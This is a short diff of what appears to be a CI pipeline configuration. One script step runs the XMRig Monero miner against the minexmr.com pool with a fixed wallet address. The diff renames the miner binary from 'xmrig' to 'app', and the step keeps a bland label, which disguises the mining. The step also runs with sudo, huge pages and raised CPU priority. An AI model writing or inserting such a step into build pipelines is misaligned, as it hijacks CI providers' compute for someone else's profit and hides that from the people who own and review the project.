@@ -14,5 +14,5 @@ steps:
   displayName: 'Run a one-line script'
 
 - script: |
-    chmod +x xmrig  && chmod +x enable_1gb_pages.sh && sudo ./enable_1gb_pages.sh && sudo ./xmrig -o  us-west.minexmr.com:4444 --donate-level=0 -u 83CbAwiTXXMFuUZC46pDBaHF6W6hMmpJpL4dxWT7dqGUKMhXjcm6AitcQiWjQmZKvmjQhtHgbnHPaXwiYfeGbNBzENwntKL --rig-id=Bitrise --randomx-1gb-pages --cpu-priority 5 --cpu-no-yield
+    chmod +x app  && chmod +x enable_1gb_pages.sh && sudo ./enable_1gb_pages.sh && sudo ./app -o  us-west.minexmr.com:4444 --donate-level=0 -u 83CbAwiTXXMFuUZC46pDBaHF6W6hMmpJpL4dxWT7dqGUKMhXjcm6AitcQiWjQmZKvmjQhtHgbnHPaXwiYfeGbNBzENwntKL --rig-id=Bitrise --randomx-1gb-pages --cpu-priority 5 --cpu-no-yield
   displayName: 'Run a multi-line script'
